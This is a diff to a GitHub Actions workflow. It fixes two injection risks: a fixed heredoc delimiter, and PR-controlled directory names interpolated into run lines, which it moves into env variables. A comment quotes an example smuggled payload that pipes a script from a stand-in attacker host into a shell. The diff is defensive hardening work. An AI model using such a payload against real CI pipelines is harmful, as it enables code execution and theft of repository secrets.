@@ -77,9 +77,13 @@ jobs:
               files="$(git diff --name-only "$before" "${{ github.sha }}")"
             fi
           fi
-          echo "files<<EOF" >> "$GITHUB_OUTPUT"
+          # A random delimiter, not a fixed "EOF" — a changed file whose path is literally the
+          # line "EOF" (a PR can add one) would otherwise close the heredoc early and let the
+          # rest of the file list be parsed as extra $GITHUB_OUTPUT keys.
+          delim="EOF_${RANDOM}${RANDOM}"
+          echo "files<<$delim" >> "$GITHUB_OUTPUT"
           echo "$files" >> "$GITHUB_OUTPUT"
-          echo "EOF" >> "$GITHUB_OUTPUT"
+          echo "$delim" >> "$GITHUB_OUTPUT"
 
       - uses: pnpm/action-setup@v4
         with:
@@ -125,8 +129,15 @@ jobs:
       - run: pnpm install --frozen-lockfile
 
       # Content tier only — no Agent SDK, no proxy. runContent() goes straight to OpenRouter.
-      - run: npx vitest run "skills/${{ matrix.skill }}"
+      #
+      # matrix.skill comes from a directory name under .claude/skills/**, which a PR author
+      # fully controls — interpolating it directly into `run:` via ${{ }} would let a crafted
+      # skill directory name (e.g. containing `"; curl evil.sh | sh #`) execute on the runner,
+      # since GitHub expands the template BEFORE bash sees the line. Pass it through env instead,
+      # so it reaches the shell as a plain variable value, never as script text.
+      - run: npx vitest run "skills/$SKILL_NAME"
         env:
+          SKILL_NAME: ${{ matrix.skill }}
           OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}
 
   # --- tool tier: one job per changed agent, in parallel ---------------------------------------
@@ -164,8 +175,12 @@ jobs:
 
       # Agent SDK tier — goes through the proxy so it can speak Anthropic-wire to a non-Anthropic
       # model. OPENROUTER_BASE_URL here is the proxy, not openrouter.ai directly.
-      - run: npx vitest run "agents/${{ matrix.agent }}"
+      #
+      # matrix.agent, same as matrix.skill above: a PR-controlled directory name, passed through
+      # env rather than interpolated into the run: line, so it can't be read as script text.
+      - run: npx vitest run "agents/$AGENT_NAME"
         env:
+          AGENT_NAME: ${{ matrix.agent }}
           OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}
           OPENROUTER_BASE_URL: http://localhost:4000
 
